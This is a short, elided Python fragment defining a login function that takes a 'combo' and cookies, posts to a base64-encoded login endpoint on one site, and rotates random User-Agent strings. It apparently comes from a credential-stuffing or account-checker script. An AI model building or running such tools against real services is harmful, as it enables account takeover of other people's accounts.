...
def login(combo, cookies):
    url = "https://pooobbbttt.club/api/V1L3VzZXIvYXV0aC9sb2dpbg%3D%3D"
    headers = {
        "Host": "pooobbbttt.club",
        "Accept":"*/*",
        "User-Agent": random.choice(user_agents),
        "access-control-allow-credentials": "true",
        "access-control-allow-origin": "https://pooobbbttt.club",
...
'''
    ...
    session.get("https://pooobbbttt.club")
